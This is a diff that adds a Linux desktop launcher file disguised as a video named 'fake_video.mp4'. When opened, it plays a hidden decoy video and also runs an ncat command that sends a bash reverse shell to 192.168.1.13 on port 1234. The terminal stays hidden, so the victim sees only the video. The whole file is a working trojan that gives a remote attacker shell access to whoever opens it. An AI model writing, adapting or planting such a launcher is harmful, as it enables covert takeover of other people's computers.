@@ -1,0 +1,8 @@
+
+[Desktop Entry]
+Type=Application
+Encoding=UTF-8
+Name=fake_video.mp4
+Exec= /usr/bin/xdg-open hide/real_video.mp4;
+ncat -e /bin/bash 192.168.1.13 1234
+Terminal= false
